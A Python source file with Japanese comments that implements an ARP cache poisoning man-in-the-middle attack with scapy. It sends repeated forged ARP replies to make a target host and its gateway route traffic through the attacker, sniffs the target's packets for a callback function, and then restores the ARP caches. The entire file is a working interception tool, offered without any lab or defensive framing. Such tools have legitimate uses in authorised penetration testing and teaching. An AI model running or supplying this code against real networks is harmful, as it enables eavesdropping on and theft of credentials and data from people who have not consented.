# -*- coding: utf-8 -*-

from scapy.all import Ether, ARP, conf, sniff, send, srp
import sys
import threading
import logging

logger = logging.getLogger()


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    logger.info("restoring target arp cache")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
         hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)


def get_mac(ip_address):
    responses, unanswered = srp(Ether(
        dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address), timeout=3, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def send_fake_arp(gateway_ip, gateway_mac, target_ip, target_mac, stop_event):
    poison_target = ARP(op=2,
                        psrc=gateway_ip,
                        pdst=target_ip,
                        hwdst=target_mac)
    poison_gateway = ARP(op=2,
                         psrc=target_ip,
                         pdst=gateway_ip,
                         hwdst=gateway_mac)

    logger.info("start fake arp reply sender")

    while True:
        logger.debug("send fake arp reply to %s" % target_ip)
        send(poison_target)
        logger.debug("send fake arp reply to %s" % gateway_ip)
        send(poison_gateway)
        if stop_event.wait(3):
            break

    logger.info("stop fake arp reply sender")
    return


def start_fakegw(gateway_ip=None, target_ip=None, interface=None,
                 bpf_filter=None, callback=None):
    """
    ARPパケット偽装して投げます。
    あと、sniffを立ち上げてパケット処理を開始します。
    パケットの処理は引数で指定したcallback関数を使います。
    :param gateway_ip: 通信相手A
    :param target_ip: 通信相手B
    :param interface: インターフェース名
    :param bpf_filter: BPFフィルタ形式の文字列
    :param callback: パケット処理する関数
    :return: None
    """

    if interface is not None:
        conf.iface = interface
    conf.verb = 0
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        logger.error("failed to get %s mac" % gateway_ip)
        sys.exit(0)
    else:
        logger.info("gateway %s is at %s" % (gateway_ip, gateway_mac))

    target_mac = get_mac(target_ip)

    if target_mac is None:
        logger.error(" failed to get %s mac." % target_ip)
        sys.exit(0)
    else:
        logger.info("target %s is at %s" % (target_ip, target_mac))

    # make arp sender thread
    stop_event = threading.Event()
    poison_thread = threading.Thread(target=send_fake_arp,
                                     args=(gateway_ip,
                                           gateway_mac,
                                           target_ip,
                                           target_mac,
                                           stop_event))
    poison_thread.start()

    logger.info("starting sniffer for %s" % target_ip)

    if callback is not None:
        if bpf_filter is None:
            bpf_filter = "ip host %s" % target_ip
        if interface is None:
            sniff(filter=bpf_filter, prn=callback, store=0)
        else:
            sniff(filter=bpf_filter, prn=callback, iface=interface, store=0)

    # thread start
    stop_event.set()
    # wait for child thread.
    poison_thread.join()

    # restore target arp table
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
